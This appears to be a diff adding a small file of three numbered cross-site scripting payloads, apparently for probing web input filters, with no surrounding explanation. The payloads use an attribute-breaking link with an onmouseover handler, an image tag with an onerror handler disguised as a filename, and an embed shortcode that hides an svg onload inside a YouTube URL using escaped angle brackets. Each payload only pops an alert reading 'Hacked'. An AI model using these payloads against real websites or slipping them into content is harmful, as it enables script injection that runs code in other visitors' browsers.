@@ -1,0 +1,8 @@
+XSS 1:
+<a href="></a><a title=" onmouseover=alert('Hacked!!!!!') "> link</a>
+
+XSS 2:
+Test<img src= a onerror=alert('Hacked!!!!!')>.jpg
+
+XSS 4:
+[embed src='https://www.youtube.com/embed/abcd\x3csvg onload=alert("Hacked..Hacked..haha")\x3e'][/embed]
